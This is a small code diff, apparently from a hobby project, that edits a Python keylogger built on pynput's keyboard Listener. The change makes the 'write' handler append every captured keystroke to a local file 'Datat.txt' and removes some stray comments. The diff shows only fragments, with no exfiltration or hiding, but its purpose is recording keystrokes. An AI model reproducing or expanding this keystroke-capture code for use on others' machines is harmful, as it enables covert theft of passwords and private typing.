@@ -3,6 +3,7 @@ import sys
 from pynput import keyboard
 from pynput.keyboard import Listener
 
+
 # define 'write' for when key is released
 def write(key):
 
@@ -10,12 +11,10 @@ def write(key):
     keydata = str(key)
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
-    with open('Datat.txt', 'r+') as file:
-        # if keydata does not me earlier criteria then keydata is written.
+    with open('Datat.txt', 'a') as file:
         file.write(keydata)
         file.close()
 
-#testing testing
 
 # defines letters
 def is_letter(value):
